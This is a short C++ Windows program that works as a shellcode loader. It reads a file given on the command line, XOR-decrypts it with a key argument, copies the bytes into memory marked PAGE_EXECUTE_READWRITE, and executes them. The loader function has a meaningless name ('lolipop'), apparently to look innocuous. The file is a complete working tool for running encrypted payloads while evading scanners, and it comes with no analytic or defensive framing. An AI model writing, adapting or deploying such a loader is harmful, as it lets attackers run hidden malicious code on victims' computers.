#include <windows.h>
#include <iostream>

void lolipop(LPCSTR filename, const char* key) {
    HANDLE fileHandle = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD fileSize = GetFileSize(fileHandle, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(fileHandle);
        return;
    }

    BYTE*  onni = new BYTE[fileSize];
    if ( onni == nullptr) {
        CloseHandle(fileHandle);
        return;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(fileHandle,  onni, fileSize, &bytesRead, NULL)) {
        delete[]  onni;
        CloseHandle(fileHandle);
        return;
    }

    CloseHandle(fileHandle);

    // Perform XOR operation using each character of the key
    size_t keyLength = strlen(key);
    for (DWORD i = 0; i < fileSize; ++i) {
        onni[i] ^= key[i % keyLength];
    }

    LPVOID executableMemory = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (executableMemory == NULL) {
        delete[]  onni;
        return;
    }

    memcpy(executableMemory,  onni, fileSize);

    ((void(*)())executableMemory)();

    delete[]  onni;
    VirtualFree(executableMemory, 0, MEM_RELEASE);
}

int main(int argc, char** argv) {
    if (argc != 3) {
        return 1;
    }

    lolipop(argv[1], argv[2]);

    return 0;
}
